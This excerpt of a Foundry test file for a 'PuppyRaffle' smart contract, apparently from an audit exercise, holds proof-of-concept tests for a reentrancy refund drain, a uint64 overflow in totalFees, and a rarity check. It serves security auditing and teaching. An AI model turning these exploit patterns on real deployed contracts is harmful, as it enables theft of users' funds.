...
contract PuppyRaffleTest is Test {
    ...
    function test_reentrancyRefund() public {
        ...
        console.log("Starting PuppyRaffle balance: ", startingContractBalance);
        console.log("Ending attacker balance: ", endingAttackContractBalance);
        console.log("Ending contract balance: ", endingContractBalance);

        assert(endingAttackContractBalance > endingContractBalance);
    }

    function test_overflow() public playersEntered {
        //set entranceFee to 20e18 for this test to be able to use the playersEntered modifier
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);
        address[] memory attackPlayer = new address[](1);
        attackPlayer[0] = attackUser;
        uint64 maxVal = 18446744073709551615;
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.enterRaffle{value: entranceFee}(attackPlayer);
        uint256 contractBalance = address(puppyRaffle).balance;
        console.log(contractBalance);
        //Total balance is 100e18, therefore, totalFees should be 20e18
        puppyRaffle.selectWinner();
        console.log(puppyRaffle.totalFees());
        assert(puppyRaffle.totalFees() < maxVal+1);
        //1.553255926290448384 ether in totalFees whereas it should be 20 ether
    }

    function test_rarity() public {
        RarityCheck rc = new RarityCheck();
        rc.test_checkRarity();
    }
...
contract RarityCheck is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(98);
    uint256 duration = 1 days;
    address playerOne = address(10);
    address playerTwo = address(11);
    address playerThree = address(12);
    address playerFour = address(13);
    ...
    function test_checkRarity() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        vm.deal(players[0], 10 ether);
        vm.deal(players[1], 10 ether);
        vm.deal(players[2], 10 ether);
        vm.deal(players[3], 10 ether);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        vm.prank(address(playerOne));
        puppyRaffle.selectWinner();
        uint256 rarity = puppyRaffle.RARITY();
        console.log(rarity);
        assert(rarity <= 70);
    }
}